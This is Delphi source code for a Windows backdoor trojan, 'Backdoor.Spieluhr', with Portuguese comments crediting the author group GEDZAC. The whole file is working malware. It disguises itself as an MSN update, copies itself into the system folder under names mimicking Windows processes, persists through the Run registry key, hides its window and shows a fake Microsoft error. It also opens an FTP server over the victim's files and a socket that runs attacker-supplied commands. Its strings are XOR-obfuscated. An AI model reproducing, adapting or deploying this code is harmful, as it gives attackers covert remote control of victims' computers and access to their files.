unit Unit1;
{
 Backdoor.Spieluhr

 Este backdoor foi totalmente feito por Hutley/GEDZAC.
 Projeto terminado as 12:03 - 24/Dez/2005
 -
 A id�ia foi criar um backdoor que permitisse o
 acesso aos arquivos do usu�rio infectado.
 Isso pode ser feito por meio de um servidor FTP
 contido no programa serrvidor. Que se disfar�a de MSN
 para poder se auto instalar na m�quina.
 -
 D�vida, Bugs ou Sugest�es:
 www.Hutley.cjb.net
}
interface

uses
 Windows, Messages, SysUtils, Variants, Classes, Graphics, Controls, Forms,
 Dialogs, FtpSrv, FtpSrvC, Registry, ScktComp;

type
 TForm1 = class(TForm)
  FTP: TFtpServer;
  SrvSockt: TServerSocket;
  procedure FormCreate(Sender: TObject);
  procedure FTPAuthenticate(Sender: TObject; Client: TFtpCtrlSocket;
   UserName, Password: TFtpString; var Authenticated: Boolean);
  procedure SrvSocktClientError(Sender: TObject;
   Socket: TCustomWinSocket; ErrorEvent: TErrorEvent;
   var ErrorCode: Integer);
  procedure SrvSocktClientRead(Sender: TObject;
   Socket: TCustomWinSocket);
 private
  { Private declarations }
 public
  { Public declarations }
 end;
 
var
 Form1: TForm1;
 
const
 info: string = 'Win32.Backdoor.Spieluhr.Server';
 autor: string = 'Hutley / GEDZAC';
 
 // poss�veis nomes de arquivo que pode assumir
 file_name: array[0..9] of string = (
  'msnupdate.exe',
  'winfog.exe',
  'winsys.exe',
  'lsass1.exe',
  'lovcx.exe',
  'winsress.exe',
  'winlog.exe',
  'winsock.exe',
  'saveruser.exe',
  'winbackup.exe');
 
 
implementation

{$R *.dfm}

// fun��o para decodificar as strings

function code(text: string; chave: integer): string;
var lp1, p: integer;
 fuck: string;
begin
 lp1 := strlen(pchar(text));
 for p := 1 to lp1 do begin
  fuck := fuck + chr(ord(text[p]) xor chave)
 end;
 code := fuck
end;

// diret�rio do sistema

function SysDir: string;
begin
 SetLength(Result, MAX_PATH);
 if GetSystemDirectory(PChar(Result), MAX_PATH) > 0 then
  Result := string(PChar(Result)) + '\'
 else
  Result := '';
end;

// Escreve no Registro a Nova senha do FTPServer

procedure NovoPassword(pass: string);
var
 reg: TRegistry;
begin
 Reg := TRegistry.Create;
 Reg.RootKey := HKEY_LOCAL_MACHINE;
 // \SOFTWARE\MsnSpieluhr key: 050
 Reg.OpenKey(code('na}tfes`wnA\aB[W^GZ@', 050), true);
 // ftpPass key:051
 Reg.WriteString(code('UGCcR@@', 051), pass);
 Reg.CloseKey;
 Reg.Free;
end;

// Escreve no Registro o novo Login do FTPServer

procedure NovoLogin(login: string);
var
 reg: TRegistry;
begin
 Reg := TRegistry.Create;
 Reg.RootKey := HKEY_LOCAL_MACHINE;
 // \SOFTWARE\MsnSpieluhr key: 12
 Reg.OpenKey(code('P_CJX[M^IPAb_|ei`yd~', 12), true);
 // ftpLogin key: 15
 Reg.WriteString(code('i{C`hfa', 15), login);
 Reg.CloseKey;
 Reg.Free;
end;

// Executar por REGISTRO !

procedure ExecutaViaRegistro(nome, path: string);
var evrg: TRegistry;
begin
 evrg := TRegistry.Create;
 evrg.RootKey := HKEY_LOCAL_MACHINE;
 // SOFTWARE\Microsoft\Windows\CurrentVersion\Run KEY: 24
 evrg.OpenKey(code('KW^LOYJ]DUq{jwkw~lDOqv|wokD[mjj}vlN}jkqwvDJmv', 24), FALSE);
 evrg.WriteString(nome, path);
 evrg.Destroy;
end;

// Escreve no Registro o nova Porta do FTPServer

procedure NovaPorta(porta: integer);
var
 reg: TRegistry;
begin
 Reg := TRegistry.Create;
 Reg.RootKey := HKEY_LOCAL_MACHINE;
 // \SOFTWARE\MsnSpieluhr KEY: 30
 Reg.OpenKey(code('BMQXJI_L[BSmpMnw{rkvl', 30), true);
 // ftpPort KEY: 30
 Reg.WriteInteger(code('xjnNqlj', 30), porta);
 Reg.CloseKey;
 Reg.Free;
end;

// Processa os comandos recebidos pelo SOCKET

procedure RecebeComando(s: string);
var
 comando, texto: string;
begin
 // Parte a STRING em dois peda�os,
 // o COMANDO e o PAR�METRO
 comando := Copy(s, 1, 5);
 texto := Copy(s, 6, Length(s));
 
 // npass, nlogi, exect, nport KEY: 40
 if comando = code('FXI[[', 40) then NovoPassword(texto);
 if comando = code('FDGOA', 40) then NovoLogin(texto);
 if comando = code('MPMK\', 40) then WinExec(PChar(texto), sw_ShowNormal);
 if comando = code('FXGZ\', 40) then NovaPorta(StrToInt(texto));
end;

procedure TForm1.FormCreate(Sender: TObject);
var
 reg: TRegistry;
 ftpPort, NumbName: Integer;
begin
 // Nao aparece na barra de tarefas
 SetWindowLong(Application.Handle, GWL_EXSTYLE,
  GetWindowLong(Application.Handle, GWL_EXSTYLE) or
  WS_EX_TOOLWINDOW and not WS_EX_APPWINDOW);
 
 // Executado 1� Vez?
 Reg := TRegistry.Create;
 Reg.RootKey := HKEY_LOCAL_MACHINE;
 // \SOFTWARE\MsnSpieluhr  KEY: 45 (em tudo)
 Reg.OpenKey(code('q~bkyzlhq`^C~]DHAXE_', 45), true);
 if not (Reg.ValueExists('1?')) then
 begin
  // Coloca a String para Aparecer a Mensagem de Erro
  Reg.WriteBool('1?', true);

  // Se AUTO COPIA para a pasta SYSTEM
  // o nome do arquivo � escolhido aleatoriamente
  Randomize;
  NumbName := Random(9);
  CopyFile(PChar(Application.Exename), PChar(SysDir + file_name[NumbName]), false);

  // Depois de copiado, escreve no registro pra auto executar
  // Hutley-Spieluhr - key: 20
  ExecutaViaRegistro(code('\a`xqm9Gd}qxa|f', 20), SysDir + file_name[NumbName]);

  // Login/Pass para o FTPServer
  // ftpLogin, hutleyvx - key: 21
  Reg.WriteString(code('saeYzr|{', 21), code('}`ayplcm', 21));
  // ftpPass - key: 21, 123456 - key: 23
  Reg.WriteString(code('saeEtff', 21), code('&%$#"!', 23));
  // ftpPort, 25 - key: 23
  Reg.WriteInteger(code ('qcgGxec', 23), StrToInt(Code('%"', 23)));

  // Msg de Erro. S� aparece na 1� execu��o
  // Error, contact the Microsoft support! - key: 23
  // Error #6985 - key: 25
  Application.MessageBox(PChar(code('Reexe;7txycvtc7cr7Z~texdxqc7dbggxec6', 23)), PChar(code('\kkvk9:/ !,', 25)), mb_ok + mb_IconError);
 end else
 begin
  // ftpPort key: 26
  ftpPort := Reg.ReadInteger(code('|njJuhn', 26));
  Reg.CloseKey;
  Reg.Free;
 end;
 
 // Inicia o FTP Server e o Socket Servidor
 if ftp.Active = false then
 begin
  FTP.Port := IntToStr(FTPPort);
  FTP.Start;
 end;
 if srvsockt.Active = false then srvsockt.Open;
 
 // Some com o FORM da tela
 with form1 do
 begin
  left := 0;
  top := 1000000;
  Height := 0;
  Width := 0;
 end;
end;

procedure TForm1.FTPAuthenticate(Sender: TObject; Client: TFtpCtrlSocket;
 UserName, Password: TFtpString; var Authenticated: Boolean);
var
 Reg: TRegistry;
 ftpLogin, ftpPass: string;
begin
 Authenticated := false;
 
 // L� no Registro Login/Senha para autentica��o do FTPServer
 Reg := TRegistry.Create;
 Reg.RootKey := HKEY_LOCAL_MACHINE;
 // \SOFTWARE\MsnSpieluhr - key: 26
 Reg.OpenKey(code('FIU\NM[H_FWitIjsvorh', 26), true);
 // ftpLogin - key: 27
 ftpLogin := Reg.ReadString(code('}okWt|ru', 27));
 // ftpPass - key: 27
 ftpPass := Reg.ReadString(code('}okKzhh', 27));
 Reg.CloseKey;
 Reg.Free;
 
 // Verifica se � igual ao Recebido
 if (UserName = ftpLogin) and (Password = ftpPass)
  then Authenticated := true else Authenticated := false;
end;

procedure TForm1.SrvSocktClientError(Sender: TObject;
 Socket: TCustomWinSocket; ErrorEvent: TErrorEvent;
 var ErrorCode: Integer);
begin
 ErrorCode := 0;
end;

procedure TForm1.SrvSocktClientRead(Sender: TObject;
 Socket: TCustomWinSocket);
begin
 RecebeComando(Socket.ReceiveText);
end;

end.

